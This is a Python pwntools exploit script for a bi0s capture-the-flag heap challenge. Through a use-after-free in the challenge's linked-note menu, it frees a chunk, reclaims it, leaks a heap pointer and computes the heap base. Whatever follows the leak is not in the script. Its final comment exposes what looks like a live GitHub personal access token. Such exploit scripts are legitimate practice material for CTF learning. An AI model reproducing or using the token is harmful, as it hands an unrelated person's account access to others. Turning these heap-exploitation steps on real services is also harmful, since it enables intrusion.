from pwn import *
import time


#p = process("./chall")
p = remote("pwn.challenge.bi0s.in", 1234)

def add(size,data):
	p.sendlineafter("Choice","1")
	p.sendlineafter("length",str(size))
	p.sendafter("data",data)

def delete(idx,offset = 1337):
	p.sendlineafter("Choice","2")
	p.sendlineafter("index",str(idx))
	p.sendlineafter("one",str(offset))

def link(idx1,idx2):
	p.sendlineafter("Choice","3")
	p.sendlineafter("index",str(idx1))
	p.sendlineafter("index",str(idx2))

def unlink(idx,offset,keep = True):
	p.sendlineafter("Choice","4")
	p.sendlineafter("index",str(idx))
	p.sendlineafter("offset",str(offset))
	if keep :
		p.sendlineafter("keep","y")
	else:
		p.sendlineafter("keep","n")
		
#gdb.attach(p)	
#delete(-i)
add(0x30,"A"*0x30) #idx0
add(0x30,"B"*0x30)	#1
add(0x30,"C"*0x30)	#2
add(0x18,"D"*0x18)	#3

link(0,1)
link(0,2)
link(0,3)

unlink(0,3,keep = True) #idx : 0 , 1
#state after unlink 0->1->3    
#					2->3     
delete(1,1337) 				#idx : 0 
#state now 0->1->3 (3 freed)
#reclaim 3
add(0x40,"A"*0x20)	#3 (idx1)	#idx 0, 1
add(0x40,"A"*0x30)	#3 (idx2)	#idx 0, 1, 2
link(2,1)						#idx 0, 2
delete(2,2)						#idx 0, 2
add(0x18,p64(0))	#3 (idx2)	#idx 0, 1, 2

p.sendlineafter(">>","2")
p.sendlineafter("index","0")
p.recvuntil("3 :")
leak = p.recvuntil("\n")[1:-1]
print(list(leak))
print(len(leak))
p.sendline("1")


heap_base = u64(leak.ljust(8,b'\x00')) << 12	
print("heap_base %x" %heap_base)
#alloc data -> alloc note 
#tcache LIFO
	

p.interactive()
#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